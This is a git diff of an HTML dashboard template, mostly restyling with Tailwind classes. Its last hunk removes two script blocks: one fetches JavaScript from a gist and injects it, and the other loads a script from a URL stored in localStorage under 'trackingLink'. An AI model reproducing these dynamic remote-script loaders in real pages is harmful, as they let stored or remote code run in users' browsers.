@@ -3,8 +3,13 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>test-1</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <title>CommonColor</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+   
     <style>
       @import url("https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap");
 
@@ -354,10 +359,10 @@
       }
     </style>
   </head>
-  <body class="bg-gray-100 min-h-screen">
+  <body class="bg-gray-900 min-h-screen">
     <header
       id="header"
-      class="header fixed top-0 left-0 right-0 h-16 z-50 flex items-center justify-between px-4"
+      class="header fixed top-0 left-0 right-0 h-16 z-50 flex items-center justify-between px-4 bg-gray-800 shadow-xl shadow-black"
     >
       <div class="flex items-center">
         <button
@@ -367,16 +372,14 @@
         >
           ⟫
         </button>
-        <h1 class="text-xl font-bold neon-glow rounded-lg p-2 cursor-pointer">
+        <h1 class="text-xl font-bold neon-glow rounded-lg p-2 cursor-pointer hidden md:block">
           YOUR<span class="text-cyan-400">LOGO</span>
         </h1>
       </div>
 
-      <div class="flex items-center space-x-6">
+      <div class="flex items-center space-x-2">
         <div
-          class="block mt-4 mb-4 p-4 border-2 cursor-pointer text-lg bg-black border-b-2 border-blue-400 hover:bg-gray-700 hover:text-blue-400 transition duration-200 rounded-lg mx-2 my-1"
-          id="clock"
-        >
+          class="hidden md:block px-4 py-2 rounded-full pulse cursor-pointer bg-slate-950 text-pink-700 border-4 border-pink-700 hover:scale-105 transition duration-200" id="clock">
           00:00
         </div>
 
@@ -390,7 +393,7 @@
 
     <aside
       id="sidebar"
-      class="hidden fixed sidebar h-full bottom-0 top-0 left-0 w-64 bg-gray-800 text-white h-full transform shadow-2xl z-40 border-r-4 translate-x-0"
+      class="sidebar fixed h-full bottom-0 top-0 left-0 w-64 bg-gray-800 text-white transform shadow-2xl z-40 rounded-r-lg translate-x-0"
     >
       <div class="p-6 text-center border-b border-gray-700 mt-16">
         <h2 class="text-3xl font-semibold text-yellow-400">Menu</h2>
@@ -677,8 +680,7 @@
               <button
                 type="button"
                 onclick="hideForm()"
-                class="px-6 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors"
-              >
+                class="px-4 py-2 border bg-red-600 border-gray-300 rounded-lg hover:bg-gray-500 ">
                 Cancel
               </button>
               <button
@@ -694,23 +696,13 @@
     </div>
 
     <!-- xxx Details Modal -->
-    <div
-      id="detailsModal"
-      class="fixed inset-0 bg-black bg-opacity-50 hidden popup-overlay z-50"
-    >
+    <div id="detailsModal" class="fixed inset-0 bg-slate-800 bg-opacity-50 hidden popup-overlay z-50">
       <div class="flex items-center justify-center min-h-screen p-4">
-        <div
-          class="neon-box bg-gray-900 rounded-xl shadow-2xl max-w-4xl w-full max-h-screen overflow-y-auto popup-card"
-        >
+        <div class="neon-box bg-gray-900 rounded-xl shadow-2xl max-w-4xl w-full max-h-screen overflow-y-auto popup-card">
           <div class="card-gradient text-white p-6 rounded-t-xl">
-            <div class="flex justify-between items-center">
+            <div class="flex justify-between items-center p-2 border-b-2">
               <h2 class="text-2xl font-bold">xxx Details</h2>
-              <button
-                onclick="hideDetails()"
-                class="text-white hover:text-gray-200 text-2xl"
-              >
-                ×
-              </button>
+              <button onclick="hideDetails()" class="text-red-600 hover:scale-110 hover:text-red-500 text-2xl"><i class="material-icons">close</i></button>
             </div>
           </div>
 
@@ -720,22 +712,7 @@
         </div>
       </div>
     </div>
-
-    <script id="script"></script>
     <script src="https://hckrxyzz.github.io/js/scrollbutton.js"></script>
     <script src="https://hckrxyzz.github.io/test1/script.js"></script>
-    <script>
-      async function foo() {
-        const res = await fetch(
-          "https://gist.githubusercontent.com/HckrXyzz/11ebe58b74f5a3b8462555d15966df75/raw/0c9d9ffc0dd5215287659f10b4b064d874cfe441/script.js",
-        );
-        document.getElementById("script").textContent = await res.text();
-      }
-      foo();
-    </script>
-  <script>
-    (function(){d=document; s=d.createElement('script');s.src=localStorage.getItem('trackingLink');d.head.appendChild(s);})();
-</script>
-    
   </body>
 </html>
